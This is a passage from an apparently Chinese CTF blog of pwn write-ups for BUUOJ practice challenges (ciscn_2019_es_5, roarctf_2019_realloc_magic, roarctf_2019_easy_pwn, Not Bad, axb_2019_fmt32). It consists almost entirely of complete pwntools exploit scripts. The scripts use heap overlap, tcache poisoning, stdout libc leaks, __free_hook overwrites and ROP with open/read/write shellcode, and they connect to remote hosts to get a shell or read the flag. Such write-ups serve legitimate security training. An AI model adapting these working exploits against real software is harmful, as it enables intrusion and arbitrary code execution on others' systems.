choice:","2")</span><br><span class="line">    sh.sendlineafter(":",str(idx))</span><br><span class="line">    if(content != ''):</span><br><span class="line">        sh.sendafter(":",content)</span><br><span class="line">def free(idx):</span><br><span class="line">    sh.sendlineafter("Your choice:","4")</span><br><span class="line">    sh.sendlineafter(":",str(idx))</span><br><span class="line">def show(idx):</span><br><span class="line">    sh.sendlineafter("Your choice:","3")</span><br><span class="line">    sh.sendlineafter(":",str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        sh = process("./ciscn_2019_es_5")</span><br><span class="line">        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">    else:</span><br><span class="line">        sh = remote(ip,port)</span><br><span class="line">        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">    add(0x0,'')</span><br><span class="line">    add(0xb0,'\n')</span><br><span class="line">    edit(0,'')</span><br><span class="line">    free(0)</span><br><span class="line">    add(0x18,'a')</span><br><span class="line">    show(0)</span><br><span class="line">    sh.recvuntil("Content: ")</span><br><span class="line">    heap_base = (u64(sh.recvuntil("\n",True).ljust(8,'\x00')) >> 12) << 12</span><br><span class="line">    edit(0,p64(heap_base + 0xa0))</span><br><span class="line">    add(0x18,p64(heap_base + 0x10))</span><br><span class="line">    payload = p64(0xfcfcfcfcfcfcfcfc) * 8 + p64(0) * ((0xb0 - 0x58) / 8) + p64(heap_base+0x10)</span><br><span class="line">    add(0xb0,payload)</span><br><span class="line">    free(1)</span><br><span class="line">    add(0x0,'')</span><br><span class="line">    show(1)</span><br><span class="line">    libc = u64(sh.recvuntil("\x7f",False)[-6:].ljust(8,'\x00')) - 96 - lib.symbols['__malloc_hook'] - 0xc0</span><br><span class="line">    __free_hook = libc + lib.symbols['__free_hook']</span><br><span class="line">    system = libc + lib.symbols['system']</span><br><span class="line">    payload = p64(0xfcfcfcfcfcfcfcfc) * 8 + p64(0) * ((0xb0 - 0x58) / 8) + p64(__free_hook) + p64(__free_hook + 8)</span><br><span class="line">    add(0xc0,payload)</span><br><span class="line">    add(0xc0,p64(system))</span><br><span class="line">    add(0xd0,'/bin/sh\x00')</span><br><span class="line">    free(6)</span><br><span class="line">    log.success("libc: " + hex(libc))</span><br><span class="line">    log.success("system: " + hex(system))</span><br><span class="line">    log.success("__free_hook: " + hex(__free_hook))</span><br><span class="line">    log.success("heap_base: " + hex(heap_base))</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        log.success("pid: " + str(sh.pid))</span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    pwn("node2.buuoj.cn.wetolink.com",28899,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x67-roarctf-2019-realloc-magic"><a href="#0x67-roarctf-2019-realloc-magic" class="headerlink" title="0x67 roarctf_2019_realloc_magic"></a>0x67 roarctf_2019_realloc_magic</h2><h3 id="realloc可以实现堆重叠，然后覆盖fd低位为tcache头，然后控制到tcache头，造出libc地址，然后覆盖低位地址为stdout，然后覆盖数据实现libc-leak，然后执行magic清空指针，然后申请堆块回到tcache头，通过tcache-attack控制free-hook-8的地址数据为-bin-sh-x00，然后向下覆盖free-hook地址为system，然后直接free就可以拿到shell。"><a href="#realloc可以实现堆重叠，然后覆盖fd低位为tcache头，然后控制到tcache头，造出libc地址，然后覆盖低位地址为stdout，然后覆盖数据实现libc-leak，然后执行magic清空指针，然后申请堆块回到tcache头，通过tcache-attack控制free-hook-8的地址数据为-bin-sh-x00，然后向下覆盖free-hook地址为system，然后直接free就可以拿到shell。" class="headerlink" title="realloc可以实现堆重叠，然后覆盖fd低位为tcache头，然后控制到tcache头，造出libc地址，然后覆盖低位地址为stdout，然后覆盖数据实现libc leak，然后执行magic清空指针，然后申请堆块回到tcache头，通过tcache attack控制free_hook - 8的地址数据为/bin/sh\x00，然后向下覆盖free_hook地址为system，然后直接free就可以拿到shell。"></a>realloc可以实现堆重叠，然后覆盖fd低位为tcache头，然后控制到tcache头，造出libc地址，然后覆盖低位地址为stdout，然后覆盖数据实现libc leak，然后执行magic清空指针，然后申请堆块回到tcache头，通过tcache attack控制<strong>free_hook - 8的地址数据为/bin/sh\x00，然后向下覆盖</strong>free_hook地址为system，然后直接free就可以拿到shell。</h3><h3 id="非预期：另外可以使用超大堆块漏洞来实现控制tcache头，但是方法较上面方法复杂，且使用存在使用条件（目标靶机必须要有足够大的内存，如果靶机内存很小，还有另一种非预期解，此方法针对可以申请大内存块的靶机），所以我一开始使用非预期解打BUUOJ平台的时候，发现打不通，但是本地却可以打通，应该也是内存申请过大的原因导致的。"><a href="#非预期：另外可以使用超大堆块漏洞来实现控制tcache头，但是方法较上面方法复杂，且使用存在使用条件（目标靶机必须要有足够大的内存，如果靶机内存很小，还有另一种非预期解，此方法针对可以申请大内存块的靶机），所以我一开始使用非预期解打BUUOJ平台的时候，发现打不通，但是本地却可以打通，应该也是内存申请过大的原因导致的。" class="headerlink" title="非预期：另外可以使用超大堆块漏洞来实现控制tcache头，但是方法较上面方法复杂，且使用存在使用条件（目标靶机必须要有足够大的内存，如果靶机内存很小，还有另一种非预期解，此方法针对可以申请大内存块的靶机），所以我一开始使用非预期解打BUUOJ平台的时候，发现打不通，但是本地却可以打通，应该也是内存申请过大的原因导致的。"></a>非预期：另外可以使用超大堆块漏洞来实现控制tcache头，但是方法较上面方法复杂，且使用存在使用条件（目标靶机必须要有足够大的内存，如果靶机内存很小，还有另一种非预期解，此方法针对可以申请大内存块的靶机），所以我一开始使用非预期解打BUUOJ平台的时候，发现打不通，但是本地却可以打通，应该也是内存申请过大的原因导致的。</h3><h3 id="Ubuntu18"><a href="#Ubuntu18" class="headerlink" title="Ubuntu18"></a>Ubuntu18</h3><h3 id="常规解"><a href="#常规解" class="headerlink" title="常规解"></a>常规解</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("roarctf_2019_realloc_magic")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        sh = process("./roarctf_2019_realloc_magic")</span><br><span class="line">        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">    else:</span><br><span class="line">        sh = remote(ip,port)</span><br><span class="line">        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">    def realloc(size,content):</span><br><span class="line">        sh.sendlineafter(">>","1")</span><br><span class="line">        sh.sendlineafter("?",str(size))</span><br><span class="line">        sh.sendafter("?",content)</span><br><span class="line">    def free():</span><br><span class="line">        sh.sendlineafter(">>","2")</span><br><span class="line">    def magic():</span><br><span class="line">        sh.sendlineafter(">>","666")</span><br><span class="line">    def Debug():</span><br><span class="line">        if(debug == 1):</span><br><span class="line">            log.success("pid: " + str(sh.pid))</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    realloc(0x100,'\x11' * 0x100)</span><br><span class="line">    free()</span><br><span class="line">    realloc(0x48,'\x12' * 0x48)</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    realloc(0xB8,'\x13' * 0xB8)</span><br><span class="line">    free()</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    realloc(0x200,'\x14' * 0x200)</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    payload = '\x15' * 0x48 + p64(0xC1) + p16(0x7010)</span><br><span class="line">    realloc(0x100,payload)</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    realloc(0xb8,'\x16' * 0xb8)</span><br><span class="line">    realloc(0x38,'\x17' * 0x38)</span><br><span class="line">    realloc(0,"")</span><br><span class="line">    payload  = p64(0xffffffffffffffff - 7) * 8</span><br><span class="line">    payload += p64(0) * 6 + p64(0x7010)</span><br><span class="line">    realloc(0xb8,payload)</span><br><span class="line">    payload = p64(0)  </span><br><span class="line">    realloc(0x68,payload)</span><br><span class="line">    payload = p64(0) * 8</span><br><span class="line">    payload += p64(0) * 6 + p16(0x7758)</span><br><span class="line">    realloc(0x168,payload)</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    payload = p64(0) + p64(0xfbad1800) + p64(0) * 3 + chr(0)</span><br><span class="line">    realloc(0x78,payload)</span><br><span class="line">    sh.recvuntil(payload[0:len(payload)-1],timeout = 1)</span><br><span class="line">    libc = u64(sh.recv(8)) - 128 - lib.symbols['_IO_2_1_stderr_']</span><br><span class="line">    system = libc +lib.symbols['system']</span><br><span class="line">    binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">    __free_hook = libc + lib.symbols['__free_hook']</span><br><span class="line">    __malloc_hook = libc + lib.symbols['__malloc_hook']</span><br><span class="line">    magic()</span><br><span class="line">    payload  = p64(0) * 8</span><br><span class="line">    payload += p64(__free_hook - 8)</span><br><span class="line">    realloc(0x168,payload)</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    realloc(18,'/bin/sh\x00' + p64(system))</span><br><span class="line">    free()</span><br><span class="line">    log.success("system: " + hex(system))</span><br><span class="line">    log.success("binsh: " + hex(binsh))</span><br><span class="line">    log.success("__free_hook: " + hex(__free_hook))</span><br><span class="line">    log.success("__malloc_hook: " + hex(__malloc_hook))    </span><br><span class="line">    log.success("libc: " + hex(libc))</span><br><span class="line">    Debug()</span><br><span class="line">    sh.interactive()</span><br><span class="line">    return True</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    #pwn("node3.buuoj.cn",28913,1)</span><br><span class="line">    while(1):</span><br><span class="line">        try:</span><br><span class="line"></span><br><span class="line">            if(pwn("node3.buuoj.cn",28164,0) == True):</span><br><span class="line">                break</span><br><span class="line">        except EOFError:</span><br><span class="line">            sh.close()</span><br><span class="line">            continue</span><br></pre></td></tr></tbody></table></figure></div>
<h3 id="Ubuntu18-1"><a href="#Ubuntu18-1" class="headerlink" title="Ubuntu18"></a>Ubuntu18</h3><h3 id="非常规解"><a href="#非常规解" class="headerlink" title="非常规解"></a>非常规解</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("roarctf_2019_realloc_magic")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        sh = process("./roarctf_2019_realloc_magic")</span><br><span class="line">        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">    else:</span><br><span class="line">        sh = remote(ip,port)</span><br><span class="line">        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">    def realloc(size,content):</span><br><span class="line">        sh.sendlineafter(">>","1")</span><br><span class="line">        sh.sendlineafter("?",str(size))</span><br><span class="line">        sh.sendafter("?",content)</span><br><span class="line">    def free():</span><br><span class="line">        sh.sendlineafter(">>","2")</span><br><span class="line">    def magic():</span><br><span class="line">        sh.sendlineafter(">>","666")</span><br><span class="line">    def Debug():</span><br><span class="line">        if(debug == 1):</span><br><span class="line">            log.success("pid: " + str(sh.pid))</span><br><span class="line">        input()</span><br><span class="line">            #x/5gx 0x555555554000+0x202058</span><br><span class="line">    max_size = -0x1</span><br><span class="line">    realloc(0x80,'\x11' * 0x80)</span><br><span class="line">    free()</span><br><span class="line">    realloc(0x100,'\x12' * 0x100)</span><br><span class="line">    free()</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    realloc(0x80,p16(0x7010))</span><br><span class="line">    realloc(max_size,'\n')</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    realloc(0x110,p16(0x7010))</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    realloc(0x100,p16(0x7010))</span><br><span class="line">    realloc(max_size,'\n')</span><br><span class="line">    #Debug()</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    realloc(0x80,p16(0x7010))</span><br><span class="line">    realloc(max_size,'\n')</span><br><span class="line">    payload  = p64(0xffffffffffffffff - 7) * 8</span><br><span class="line">    payload += p64(0) * 16 + p16(0x7010)</span><br><span class="line">    realloc(0x100,payload)</span><br><span class="line">    free()</span><br><span class="line">    realloc(0x80,'\n')</span><br><span class="line">    payload  = p64(0) * 8</span><br><span class="line">    payload += p64(0) * 11 + p16(0x7758)# + chr(0xdd)</span><br><span class="line">    realloc(0x200,payload)</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    payload = p64(0) + p64(0xfbad1800) + p64(0) * 3 + chr(0)</span><br><span class="line">    realloc(0xc0,payload)</span><br><span class="line">    sh.recvuntil(payload[0:len(payload)-1],timeout = 3)</span><br><span class="line">    libc = u64(sh.recv(8)) - 128 - lib.symbols['_IO_2_1_stderr_']</span><br><span class="line">    system = libc +lib.symbols['system']</span><br><span class="line">    binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">    __free_hook = libc + lib.symbols['__free_hook']</span><br><span class="line">    __malloc_hook = libc + lib.symbols['__malloc_hook']</span><br><span class="line">    magic()</span><br><span class="line">    payload = p64(0) * 8</span><br><span class="line">    payload += p64(__free_hook - 8)</span><br><span class="line">    realloc(0x118,payload)</span><br><span class="line">    realloc(0,'') </span><br><span class="line">    realloc(0x18,"/bin/sh\x00" + p64(system))</span><br><span class="line">    free()</span><br><span class="line">    log.success("system: " + hex(system))</span><br><span class="line">    log.success("binsh: " + hex(binsh))</span><br><span class="line">    log.success("__free_hook: " + hex(__free_hook))</span><br><span class="line">    log.success("__malloc_hook: " + hex(__malloc_hook))    </span><br><span class="line">    log.success("libc: " + hex(libc))</span><br><span class="line">    sh.interactive()</span><br><span class="line">    return True</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    #pwn("node3.buuoj.cn",28913,0)</span><br><span class="line">    while(1):</span><br><span class="line">        try:</span><br><span class="line">            if(pwn("node3.buuoj.cn",28460,0) == True):#"node3.buuoj.cn",28460</span><br><span class="line">                break</span><br><span class="line">        except EOFError:</span><br><span class="line">            sh.close()</span><br><span class="line">            continue</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x68-roarctf-2019-easy-pwn"><a href="#0x68-roarctf-2019-easy-pwn" class="headerlink" title="0x68 roarctf_2019_easy_pwn"></a>0x68 roarctf_2019_easy_pwn</h2><h3 id="堆块重叠即可"><a href="#堆块重叠即可" class="headerlink" title="堆块重叠即可"></a>堆块重叠即可</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("roarctf_2019_easy_pwn")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global lib</span><br><span class="line">	global sh</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./roarctf_2019_easy_pwn")</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("libc-2.23.so")</span><br><span class="line">	def add(size):</span><br><span class="line">		sh.sendlineafter(":","1")</span><br><span class="line">		sh.sendlineafter(":",str(size))</span><br><span class="line">	def free(idx):</span><br><span class="line">		sh.sendlineafter(":","3")</span><br><span class="line">		sh.sendlineafter(":",str(idx))</span><br><span class="line">	def edit(idx,size,content):</span><br><span class="line">		sh.sendlineafter(":","2")</span><br><span class="line">		sh.sendlineafter(":",str(idx))</span><br><span class="line">		sh.sendlineafter(":",str(size))</span><br><span class="line">		sh.sendafter(":",content)</span><br><span class="line">	def show(idx):</span><br><span class="line">		sh.sendlineafter(":","4")#x/50gx 0x202040 + </span><br><span class="line">		sh.sendlineafter(":",str(idx))</span><br><span class="line">	def Debug():</span><br><span class="line">		if(debug == 1):</span><br><span class="line">			gdb_script = 'x/50gx &__free_hook - 0x10'</span><br><span class="line">			gdb.attach(sh,gdb_script)</span><br><span class="line">	add(0x18)</span><br><span class="line">	add(0x18)	</span><br><span class="line">	add(0x88)</span><br><span class="line">	add(0x18)</span><br><span class="line">	edit(0,(0x18 + 10),'a' * 0x18 + "\x91")</span><br><span class="line">	payload = '\x13' * 0x68 + p64(0x21)</span><br><span class="line">	payload = payload.ljust(0x88,'\x13')</span><br><span class="line">	edit(2,0x88,payload)</span><br><span class="line">	free(1)</span><br><span class="line">	add(0x88)</span><br><span class="line">	payload = p64(0) * 3 + p64(0x91)</span><br><span class="line">	payload = payload.ljust(0x88,'\x11')</span><br><span class="line">	edit(1,0x88,payload)</span><br><span class="line">	free(2)</span><br><span class="line">	payload = 'a' * 0x20</span><br><span class="line">	edit(1,len(payload),payload)</span><br><span class="line">	show(1)</span><br><span class="line">	libc = u64(sh.recvuntil('\x7f',False)[-6:].ljust(8,'\x00')) - 88 - lib.symbols['__malloc_hook'] - 0x10</span><br><span class="line">	system = libc +lib.symbols['system']</span><br><span class="line">	binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">	__free_hook = libc +lib.symbols['__free_hook']</span><br><span class="line">	__malloc_hook = libc +lib.symbols['__malloc_hook']</span><br><span class="line">	payload = p64(0) * 3 + p64(0x91) + p64(0) + p64(__free_hook - 0x50 + 3)</span><br><span class="line">	edit(1,len(payload),payload)</span><br><span class="line">	add(0x88)</span><br><span class="line">	payload = p64(0) * 3 + p64(0x71)</span><br><span class="line">	edit(1,len(payload),payload)</span><br><span class="line">	payload = ''</span><br><span class="line">	payload = payload.ljust(0x68,'\x00')</span><br><span class="line">	payload += p64(0x21)</span><br><span class="line">	edit(2,len(payload),payload)</span><br><span class="line">	free(2)</span><br><span class="line">	payload = p64(0) * 3 + p64(0x71) + p64(__free_hook - 0x40)</span><br><span class="line">	edit(1,len(payload),payload)</span><br><span class="line">	add(0x68)</span><br><span class="line">	add(0x68)</span><br><span class="line">	payload = p64(0) * 6 + p64(system)</span><br><span class="line">	edit(4,len(payload),payload)</span><br><span class="line">	payload = '/bin/sh\x00'</span><br><span class="line">	edit(0,len(payload),payload)</span><br><span class="line">	free(0)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("node3.buuoj.cn",28092,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x69-极客大挑战-2019-Not-Bad"><a href="#0x69-极客大挑战-2019-Not-Bad" class="headerlink" title="0x69 [极客大挑战 2019]Not Bad"></a>0x69 [极客大挑战 2019]Not Bad</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("bad")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        sh = process("./bad")</span><br><span class="line">        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">    else:</span><br><span class="line">        sh = remote(ip,port)</span><br><span class="line">        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">    payload = 'a' * 9</span><br><span class="line">    payload += p64(0x400A34)</span><br><span class="line">    payload = payload.ljust(0x20,'a')</span><br><span class="line">    payload += p64(0xc3ca29c429485e55)</span><br><span class="line">    payload += p64(0x4009EE) </span><br><span class="line">    sh.sendlineafter("fun!\n",payload)</span><br><span class="line">    sleep(0.2)</span><br><span class="line">    pop_rdi_ret = elf.search(asm("pop rdi\nret")).next()</span><br><span class="line">    pop_rsi_r15_ret = elf.search(asm("pop rsi\npop r15\nret")).next()</span><br><span class="line">    payload = 'a' * 8</span><br><span class="line">    payload += p64(pop_rdi_ret)</span><br><span class="line">    payload += p64(0)</span><br><span class="line">    payload += p64(pop_rsi_r15_ret)</span><br><span class="line">    payload += p64(elf.bss()) + p64(0)</span><br><span class="line">    payload += p64(elf.plt['read'])</span><br><span class="line">    payload += p64(elf.bss())</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    sleep(0.2)</span><br><span class="line">    shellcode = shellcraft.open("/flag")</span><br><span class="line">    shellcode += shellcraft.read(3,elf.bss() + 0x800,0x30)</span><br><span class="line">    shellcode += shellcraft.write(1,elf.bss() + 0x800,0x30)</span><br><span class="line">    sh.sendline(asm(shellcode))</span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    pwn("node3.buuoj.cn",28235,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x70-axb-2019-fmt32"><a href="#0x70-axb-2019-fmt32" class="headerlink" title="0x70 axb_2019_fmt32"></a>0x70 axb_2019_fmt32</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 